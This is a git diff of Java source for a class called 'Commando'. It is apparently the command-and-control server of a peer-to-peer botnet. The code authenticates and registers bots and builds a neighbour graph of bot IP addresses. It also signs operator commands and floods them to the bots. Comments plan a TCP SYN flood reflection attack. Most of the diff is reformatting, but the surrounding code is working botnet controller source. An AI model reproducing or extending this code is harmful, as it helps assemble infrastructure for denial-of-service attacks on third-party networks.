@@ -23,6 +23,7 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
 
+import ch.qos.logback.classic.net.SyslogAppender;
 import cs.sii.bot.action.Auth;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
@@ -41,16 +42,16 @@ public class Commando {
 
 	@Autowired
 	private Auth auth;
-	
+
 	@Autowired
 	private CecRequest req;
-	
+
 	@Autowired
 	private BotServiceImpl bServ;
-	
+
 	@Autowired
 	private NetworkService nServ;
-	
+
 	@Autowired
 	private UserServiceImpl userService;
 
@@ -60,7 +61,6 @@ public class Commando {
 	private CryptoPKI pki;
 	@Autowired
 	private CryptoUtils crypto;
-	
 
 	/**
 	 * 
@@ -76,7 +76,6 @@ public class Commando {
 		nServ.updateDnsInformation();
 		graph = createNetworkP2P();
 		System.out.println("blab " + graph);
-		
 
 	}
 
@@ -135,7 +134,7 @@ public class Commando {
 		}
 		System.out.println("graph" + graph2);
 		System.out.println("gdegree " + calculateK(nodes.size()));
-		this.graph=graph2;
+		this.graph = graph2;
 		return graph;
 	}
 
@@ -165,10 +164,11 @@ public class Commando {
 		if (auth.findBotChallengeInfo(idBot)) {
 			if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
 				response = "Challenge OK";
+				objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
 				Bot bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
 						objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
-						objects.get(6).toString(), (PublicKey) objects.get(7),
-						Boolean.parseBoolean(objects.get(8).toString()));
+						objects.get(6).toString(), (PublicKey) objects.get(8),
+						Boolean.parseBoolean(objects.get(9).toString()));
 				bServ.save(bot);
 			}
 		}
@@ -198,12 +198,12 @@ public class Commando {
 				Set<DefaultEdge> neighbours = graph.edgesOf(new IP(bot.getIp()));
 				if (neighbours.size() < calculateK(bServ.findAll().size())) {
 					updateNetworkP2P();
-				} 
-			}else {
-					updateNetworkP2P();
 				}
+			} else {
+				updateNetworkP2P();
+			}
 		}
-			
+
 		Set<DefaultEdge> setEd = graph.edgesOf(new IP(bot.getIp()));
 		DefaultEdge[] a = new DefaultEdge[setEd.size()];
 		setEd.toArray(a);
@@ -226,56 +226,52 @@ public class Commando {
 		return ipN;
 	}
 
+	// TODO inserire metodi che inviano i comandi alla rete a comando dal sito
 
-// TODO inserire metodi che inviano i comandi alla rete a comando dal sito
+	// attaca tcp syn flood reflection
+	//
+	// invia comandi ricevuti da pannello al vicinato
 
-// attaca tcp syn flood reflection
-//
-// invia comandi ricevuti da pannello al vicinato
+	// Differenziare comandi per il singolo ai comandi per la rete(es sleep per
+	// un
+	// bot, attacco per la rete)
 
-// Differenziare comandi per il singolo ai comandi per la rete(es sleep per un
-// bot, attacco per la rete)
+	@Async
+	public void flooding(String cmd, String userSSoID) {
 
+		User user = userService.getUserRepository().findBySsoId(userSSoID);
+		if (user != null) {
 
-@Async
-public void flooding(String cmd, String userSSoID) {
-	
-	User user=userService.getUserRepository().findBySsoId(userSSoID);
-	if(user!=null){
-		
-		String msg="";
-		// aggiungi nonce time.millis
-		Long milli = System.currentTimeMillis();
-	
-		Random rand=new SecureRandom(milli.toString().getBytes());
-		Integer nounce=rand.nextInt();
-		
-		String hashIdMsg=crypto.generateSha256(nounce.toString());
-		
-		String signature;
-		try {
-			signature = pki.signMessageRSA(hashIdMsg);
-			msg=hashIdMsg+"|"+cmd+"|"+signature;
-		} catch (InvalidKeyException | SignatureException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
+			String msg = "";
+			// aggiungi nonce time.millis
+			Long milli = System.currentTimeMillis();
+
+			Random rand = new SecureRandom(milli.toString().getBytes());
+			Integer nounce = rand.nextInt();
+
+			String hashIdMsg = crypto.generateSha256(nounce.toString());
+
+			String signature;
+			try {
+				signature = pki.signMessageRSA(hashIdMsg);
+				msg = hashIdMsg + "|" + cmd + "|" + signature;
+			} catch (InvalidKeyException | SignatureException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+				System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
+			}
+
+			startFlood(msg);
 		}
-		
-		startFlood(msg);
 	}
-}
 
-
-public void startFlood(String msg){
-	nServ.getNeighbours().getList().forEach((pairs)->{
+	public void startFlood(String msg) {
+		nServ.getNeighbours().getList().forEach((pairs) -> {
 			req.sendFloodToBot(pairs.getValue1().toString(), msg);
-	});
+		});
+	}
+
 }
-
-
-}
-
 
 // for (int i = 1; i < 20; i++) {
 // nodes.add(new IP("192.168.0." + i));
